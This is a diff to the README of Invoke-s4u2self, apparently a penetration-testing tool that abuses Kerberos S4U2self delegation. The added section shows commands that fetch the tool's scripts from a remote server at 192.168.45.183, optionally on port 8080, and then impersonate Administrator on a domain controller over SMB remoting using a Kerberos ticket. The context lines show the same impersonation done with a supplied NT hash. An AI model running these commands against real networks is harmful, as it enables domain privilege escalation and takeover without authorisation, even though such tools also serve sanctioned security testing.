@@ -43,6 +43,17 @@ Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -PSRemoting -Ticke
 Invoke-s4u2self -ComputerName DC01 -Domain ferrari.local -DomainController DC01.ferrari.local -Impersonate Administrator -PSRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
 ```
 
+### Serve Scripts
+
+You can serve the necessary scripts from a server ip and port
+
+```
+Invoke-s4u2self -Server "192.168.45.183" -ComputerName CDC01 -Impersonate Administrator -SMBRemoting -Ticket doI...TQ==
+```
+```
+Invoke-s4u2self -Server "192.168.45.183:8080" -ComputerName CDC01 -Impersonate Administrator -SMBRemoting -Ticket doI...TQ==
+```
+
 ![image](https://github.com/Leo4j/Invoke-s4u2self/assets/61951374/b9075667-bee3-40b6-bf6e-e4d227ac6ac9)
 
 ![image](https://github.com/Leo4j/Invoke-s4u2self/assets/61951374/ab213a41-dcbf-4b48-a67c-e0ebe478be12)
